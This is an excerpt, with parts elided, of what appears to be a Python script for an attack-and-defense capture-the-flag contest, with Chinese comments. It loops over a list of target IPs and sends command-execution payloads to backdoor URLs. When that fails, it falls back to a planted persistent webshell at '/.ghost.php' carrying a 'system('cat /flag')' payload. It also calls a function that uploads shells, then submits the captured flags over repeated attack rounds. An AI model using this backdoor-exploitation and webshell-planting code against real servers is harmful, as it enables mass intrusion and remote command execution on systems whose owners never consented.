...
def submit(ip, flag_text):  # 提交flag
    try:
        ...
        if submit_re.find("success") != -1:
            print("\033[0;32m[提交FLAG成功]\033[0m" + ip + " --> " + submit_re)
        else:
            print("\033[0;31m[提交FLAG失败]\033[0m" + ip + " --> " + submit_re)
    except Exception as e:
        print("\033[1;35m[提交FLAG异常]\033[0m" + ip + " --> " + str(e))
        return False
...
def backdoor_attack(ip, url_path, method, payload):  # 利用命令执行后门漏洞攻击
    try:
        if method == "get":
            ...
            r = requests.post("http://" + ip + url_path, data=payload, timeout=5)
            print("http://" + ip + url_path)
            print(r)
            print(r.text)
        # 正则匹配flag
        ...
        print(
            "\033[1;35m[后门攻击失败]\033[0m"
            + ip
            + " --> backdoor_attack()执行失败 --> "
            + str(e)
        )
        return False
...
def main():
    ...
    for ip in ip_list:
        if ip:
            ...
            if flag != False:
                submit(ip, flag)
                up_shell(ip, url_path, "post", "a")
                save_txt(ip + "   " + flag)
            else:  # 原有后门异常后尝试利用不死马
                udshell_path = "/.ghost.php"
                udshell_payload = {"pass": "shang", "a": "system('cat /flag');"}
                flag = backdoor_attack(ip, udshell_path, "post", udshell_payload)
                if flag != False:
                    save_txt(flag, "flag_list.txt")
                    submit(ip, flag)
                else:  # 记录攻击失败IP
...
if __name__ == "__main__":
    ...
    with open("flag_list.txt", "w") as file:
        file.truncate(0)
    try:
        for i in range(1, 100000):
            print(
                "\033[1;33m[开始本轮攻击]\033[0m"
